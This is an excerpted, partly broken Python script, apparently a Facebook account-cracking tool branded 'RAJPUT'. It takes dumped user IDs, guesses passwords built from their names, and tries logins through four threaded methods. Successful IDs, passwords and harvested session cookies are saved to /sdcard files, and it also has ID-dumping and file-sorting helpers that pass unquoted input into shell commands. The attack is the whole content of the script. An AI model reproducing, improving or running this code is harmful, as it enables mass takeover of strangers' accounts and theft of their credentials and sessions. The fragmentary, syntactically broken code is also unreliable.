...
from concurrent.futures import ThreadPoolExecutor as RAJPUT rajput
from string import * 
...
sys.stdout.write('\x1b]2; rajput\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
 \033[1;37m ____        _             _    
\033[1;37m |  _ \ __ _ (_)_ __  _   _| |_  
 \033[1;37m| |_) / _` || | '_ \| | | | __| 
\033[1;37m |  _ < (_| || | |_) | |_| | |_  
\033[1;37m|_| \_\__,_|/ | .__/ \__,_|\__| 
\033[1;37m              |__/|_|               
\033[1;37m------------------------------------------------
\033[1;37m Owner   :             RAJPUT 
\033[1;37m Facebook:          RAJPUT 
\033[1;37m Github  :            RAJPUT -rajput
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back rajput Menu ")
        exit()
...
def RAJPUT ():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/IPNYYHRc1eSBKFAJRnXXn2')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/groups/4806853696110472/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        rajput(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[rajput] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rajputb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={rajputb};{ckkk}"
                    print(f"\r{R} [rajput-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/rajput_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/rajput_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [rajput-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/rajput_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[rajput] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [rajput-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/rajput_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/rajput_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [rajput-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[rajput] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[rajput] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [rajput-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/rajput_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with RAJPUT rajput(max_workers=30) as rajputworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                rajputworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                rajputworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                rajputworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                rajputworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/rajput.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/rajput.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    rajput = input('Put File Name :')
    print(" ")
    RAJPUT  = input('Saving Put File Name :')
    os.system('touch ' +RAJPUT )
    os.system('sort -r '+rajput+' | uniq > '+RAJPUT )
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + rajput )
    print(47*'-')
    print("File Saved To :" + RAJPUT  )
    print(47*'-')
    input(f"{S} Press Enter To Back rajput Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/rajput.txt\n') 
        filepath = input("Put File Name: ")
